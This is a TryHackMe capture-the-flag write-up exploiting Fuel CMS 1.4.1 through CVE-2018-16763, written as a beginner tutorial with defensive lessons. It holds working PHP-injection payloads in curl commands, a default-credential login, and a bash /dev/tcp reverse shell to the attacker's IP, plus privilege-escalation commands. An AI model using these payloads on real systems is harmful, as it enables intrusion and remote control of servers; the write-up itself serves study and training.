# Penetration Test Writeup: Fuel CMS Remote Code Execution
### CVE-2018-16763 | TryHackMe Lab | August 2026

---

## Table of Contents
1. [Introduction](#introduction)
2. [What is Penetration Testing?](#what-is-penetration-testing)
3. [Lab Setup](#lab-setup)
4. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
5. [Phase 2 — Enumeration](#phase-2--enumeration)
6. [Phase 3 — Vulnerability Identification](#phase-3--vulnerability-identification)
7. [Phase 4 — Exploitation](#phase-4--exploitation)
8. [Phase 5 — Post-Exploitation](#phase-5--post-exploitation)
9. [Key Lessons Learned](#key-lessons-learned)
10. [Glossary](#glossary)

---

## Introduction

This writeup documents a full penetration test conducted against a TryHackMe lab machine running Fuel CMS 1.4.1. The objective was to gain unauthorised access to the target machine, identify vulnerabilities, exploit them, and retrieve a hidden flag file — simulating a real-world attacker's approach.

**Target IP:** 10.130.163.4  
**Attacker IP (VPN):** 192.168.157.105  
**Flag Captured:** `THM{ACKME_BLOG_HACKED}`  
**CVE Exploited:** CVE-2018-16763 (Fuel CMS Remote Code Execution)  
**Difficulty:** Beginner–Intermediate

---

## What is Penetration Testing?

Penetration testing (also called "pen testing" or "ethical hacking") is the practice of intentionally attacking a system — with permission — to find security weaknesses before real attackers do. It follows a structured process:

```
Reconnaissance → Enumeration → Vulnerability ID → Exploitation → Post-Exploitation → Reporting
```

Each phase builds on the last. You cannot exploit what you have not found, and you cannot find what you have not looked for.

---

## Lab Setup

**Tools Used:**
- **Kali Linux** — attacker's operating system (a Linux distribution built for security testing)
- **Nmap** — network scanner that finds open ports and services on a target
- **Gobuster** — directory/file brute-forcing tool for web servers
- **curl** — command-line tool for making HTTP requests
- **Netcat (nc)** — networking tool used to catch incoming reverse shell connections
- **Python 3** — scripting language used to build a custom exploit script
- **TryHackMe VPN** — connects your attacker machine to the lab network

---

## Phase 1 — Reconnaissance

### What is Reconnaissance?
Reconnaissance (recon) is the information-gathering phase. The goal is to learn as much as possible about the target before touching it with any attack tools. Think of it like surveying a building before attempting to enter — you want to know how many doors and windows exist, what's inside, and what security measures are visible.

### Step 1.1 — Port Scanning with Nmap

A **port** is like a numbered door on a server. Different services run on different ports — web servers typically use port 80 (HTTP) and port 443 (HTTPS), while remote access uses port 22 (SSH).

**Command run:**
```bash
nmap -sV 10.130.163.4
```

**Flag explanations:**
- `-sV` — Service version detection (find out not just what port is open, but what software is running on it and what version)

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | Open | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | Open | HTTP | Apache httpd 2.4.41 (Ubuntu) |
| 68/udp | Open/Filtered | DHCP | — |

**What this tells us:**
- Port 22 (SSH) — could be used for remote login if we find valid credentials
- Port 80 (HTTP) — a web server is running; this is the main attack surface
- Port 68 (UDP/DHCP) — not useful for exploitation; ignored

**Operating System:** Ubuntu Linux (confirmed from service banners)  
**Network Distance:** 3 hops between attacker and target

---

## Phase 2 — Enumeration

### What is Enumeration?
Enumeration goes deeper than recon. While recon tells you a web server exists, enumeration tells you *what's on* that web server — hidden pages, admin panels, login forms, and misconfigured directories.

### Step 2.1 — Web Directory Enumeration with Gobuster

**Command run:**
```bash
gobuster dir -u http://10.130.163.4 -w /usr/share/wordlists/dirb/common.txt
```

**Flag explanations:**
- `dir` — directory enumeration mode
- `-u` — the target URL
- `-w` — wordlist (a text file containing thousands of common directory/file names to try)

**Notable results:**

| Path | Status Code | Notes |
|------|-------------|-------|
| /index.php | 200 OK | Main page — PHP-based application |
| /robots.txt | 200 OK | Small file; worth checking |
| /assets | 301 Redirect | Static files directory |
| /offline | 200 OK | Possible maintenance page |

> **Status code reference:**  
> `200` = Page exists and loaded successfully  
> `301` = Redirect to another URL  
> `403` = Forbidden (page exists but access denied)  
> `404` = Page does not exist

### Step 2.2 — Manual Web Browsing

Browsed to the target URL in the browser and checked key paths:
- `http://10.130.163.4/` — Basic blog site ("Acme's Blog")
- `http://10.130.163.4/robots.txt` — Checked for hidden paths disclosed here
- `http://10.130.163.4/fuel/login` — **Fuel CMS admin login panel discovered**

The `/fuel/login` path is the standard admin panel location for **Fuel CMS**, a PHP-based content management system. This confirmed the technology stack.

---

## Phase 3 — Vulnerability Identification

### What is Vulnerability Identification?
Once you know what software is running, you research known weaknesses (called **vulnerabilities**) in that software. Security researchers publish discovered vulnerabilities using a standardised identifier called a **CVE** (Common Vulnerabilities and Exposures number).

### Step 3.1 — Identifying the CVE

**Software identified:** Fuel CMS version ≤ 1.4.1  
**CVE identified:** CVE-2018-16763

**What is CVE-2018-16763?**  
This vulnerability exists in the way Fuel CMS handles a URL parameter called `filter` in the `/fuel/pages/select/` endpoint. The application passes user input directly into a PHP function called `create_function()` without properly sanitising (cleaning) it first. This allows an attacker to inject arbitrary PHP code — including commands that run on the underlying server — a class of vulnerability called **Remote Code Execution (RCE)**.

In simpler terms: the application was designed to let administrators filter a list of pages. But because it didn't validate what users typed into the filter field, an attacker could type PHP commands instead of a normal filter, and the server would run those commands as if they were legitimate instructions.

**Searching for known exploits:**
```bash
searchsploit --cve CVE-2018-16763
```

Results returned three public exploit scripts:
- `php/webapps/47138.py` — Python 2 script (broken on Python 3)
- `php/webapps/50477.py` — Python 3 script (working but with output parsing issues)
- `php/webapps/49487.rb` — Ruby script (partial functionality)

---

## Phase 4 — Exploitation

### What is Exploitation?
Exploitation is the phase where you actively use a vulnerability to gain access. This is the most technical phase and requires understanding both the vulnerability and the target environment.

### Step 4.1 — Gaining Admin Access via Default Credentials

Before attempting technical exploitation, standard practice is to test **default credentials** — factory-set username and password combinations that many systems ship with and administrators forget to change.

**Credentials tested:**
```
Username: admin
Password: admin
```

**Result: Access granted.** The Fuel CMS admin panel was accessible with these default credentials — a critical misconfiguration on its own, separate from the RCE vulnerability.

> **Why this matters:** Default credentials are one of the most common real-world vulnerabilities. According to multiple industry reports, a significant percentage of successful breaches involve unchanged default or weak credentials. Always change default credentials immediately after installation.

### Step 4.2 — Confirming the Exploit Endpoint

The vulnerable endpoint was confirmed using curl (a command-line HTTP request tool):

```bash
curl -g -b cookies.txt \
"http://10.130.163.4/fuel/pages/select/?filter=1);}phpinfo();/*"
```

**What this does:** Injects PHP's `phpinfo()` function into the filter parameter. If the server is vulnerable, it executes this function and returns PHP configuration details in the response.

**Authentication note:** The endpoint required a valid admin session cookie. The session cookie was obtained by logging in via curl:

```bash
curl -c cookies.txt \
  -d "user_name=admin&password=admin&forward=" \
  "http://10.130.163.4/fuel/login"
```

The `-c cookies.txt` flag saves the session cookie to a file for reuse in subsequent requests.

### Step 4.3 — Identifying Available PHP Functions

During testing, the `system()` function (commonly used to run system commands) returned no output, suggesting it was disabled by the server's PHP configuration.

The function `passthru()` was tested instead and **successfully executed commands**:

```bash
curl -s "http://10.130.163.4/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27passthru%27))%2B%24a(%27id%27)%2B%27" \
  -b cookies.txt | grep -i "uid="
```

**Result:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms **Remote Code Execution** as the `www-data` user (the user account Apache web servers run under on Ubuntu).

> **What is www-data?** On Linux systems running Apache, the web server process runs under a low-privilege user account called `www-data`. This is a security measure — if the web server is compromised, the attacker only gets `www-data` privileges initially, not root (administrator) access.

### Step 4.4 — Establishing a Reverse Shell

A **reverse shell** is a technique where the *target* machine connects *back* to the attacker's machine, giving the attacker an interactive terminal session. This bypasses most firewall rules because the connection originates from inside the target network.

**Step 1 — Start a listener on the attacker machine:**
```bash
nc -lvnp 4444
```
- `nc` = Netcat
- `-l` = listen mode
- `-v` = verbose output
- `-n` = no DNS resolution
- `-p 4444` = listen on port 4444

**Step 2 — Send the reverse shell payload via the exploit:**
```bash
curl -s -b cookies.txt -G "http://10.130.163.4/fuel/pages/select/" \
--data-urlencode "filter='+pi(print(\$a='passthru'))+\$a('bash -c \"bash -i >& /dev/tcp/192.168.157.105/4444 0>&1\"')+'"
```

**What the payload does:**
- `bash -i` — starts an interactive bash shell
- `>& /dev/tcp/192.168.157.105/4444` — redirects the shell's input and output through a TCP connection to the attacker's IP on port 4444
- `0>&1` — also redirects standard input through that same connection

**Result:** A shell connection was received on the Netcat listener:

```
connect to [192.168.157.105] from (UNKNOWN) [10.130.163.4] 53128
bash: cannot set terminal process group (806): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ackme-blog:/var/www/html/fuelcms$
```

The attacker now has an interactive terminal on the target machine as `www-data`.

---

## Phase 5 — Post-Exploitation

### What is Post-Exploitation?
Once access is gained, the penetration tester explores what data and systems are accessible, simulating what a real attacker could achieve. In a CTF (Capture the Flag) lab, the goal is typically to find a hidden "flag" file.

### Step 5.1 — System Exploration

**Commands run after gaining the reverse shell:**

```bash
whoami
# www-data

ls
# README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt

cd /home/ubuntu
ls
# flag.txt

cat flag.txt
# THM{ACKME_BLOG_HACKED}
```

**Flag captured:** `THM{ACKME_BLOG_HACKED}`

### Step 5.2 — What a Real Attacker Would Do Next

In a real engagement (not a CTF), the attacker would continue with **privilege escalation** — attempting to gain root (administrator) access. Common methods include:

- `sudo -l` — check if `www-data` can run any commands as root without a password
- `find / -perm -4000 -type f 2>/dev/null` — find SUID binaries (programs that run with elevated privileges)
- Checking the kernel version for known exploits
- Looking for stored passwords in configuration files

---

## Key Lessons Learned

### Security Failures Demonstrated in This Lab:

**1. Default credentials were never changed**  
The admin panel used `admin`/`admin` — the factory default. This alone would constitute a critical vulnerability in a real assessment, regardless of the RCE.

**2. Outdated software with known vulnerabilities**  
Fuel CMS 1.4.1 has a publicly documented CVE with working exploit code available on Exploit-DB. Keeping software updated patches known vulnerabilities before attackers can use them.

**3. PHP's `disable_functions` was partially configured**  
The server disabled `system()` but left `passthru()` enabled. A complete lockdown would disable all dangerous PHP execution functions.

**4. The web server ran with predictable file structure**  
The admin panel was accessible at the default `/fuel/login` path with no IP restrictions, rate limiting, or multi-factor authentication.

### Skills Demonstrated:
- Network scanning and port identification
- Web application enumeration
- CVE research and exploit adaptation
- HTTP request manipulation and cookie-based authentication
- PHP function testing and bypass
- Reverse shell establishment
- Post-exploitation file system navigation

---

## Glossary

| Term | Definition |
|------|-----------|
| **CVE** | Common Vulnerabilities and Exposures — a standardised identifier for publicly known security vulnerabilities |
| **RCE** | Remote Code Execution — a vulnerability class allowing an attacker to run arbitrary commands on a remote machine |
| **Port** | A numbered communication endpoint on a server; different services listen on different port numbers |
| **Nmap** | Network Mapper — a tool for discovering hosts and services on a network |
| **Gobuster** | A tool that brute-forces directories and files on web servers using wordlists |
| **Payload** | Malicious code or data sent to a vulnerable target to trigger or exploit a vulnerability |
| **Reverse Shell** | A shell session where the target connects back to the attacker, giving the attacker remote control |
| **www-data** | The low-privilege Linux user account under which Apache web servers typically run |
| **Session Cookie** | A small piece of data stored by a browser that proves you are logged in to a web application |
| **SUID Binary** | A Linux executable that runs with the file owner's privileges rather than the running user's privileges |
| **Enumeration** | The process of systematically extracting information about a target system or application |
| **Default Credentials** | Factory-set username and password combinations that ship with software and should be changed immediately |
| **Privilege Escalation** | The process of gaining higher-level system access after an initial foothold (e.g., from www-data to root) |

---

*Writeup produced for portfolio and study purposes. All testing was conducted in an authorised lab environment.*
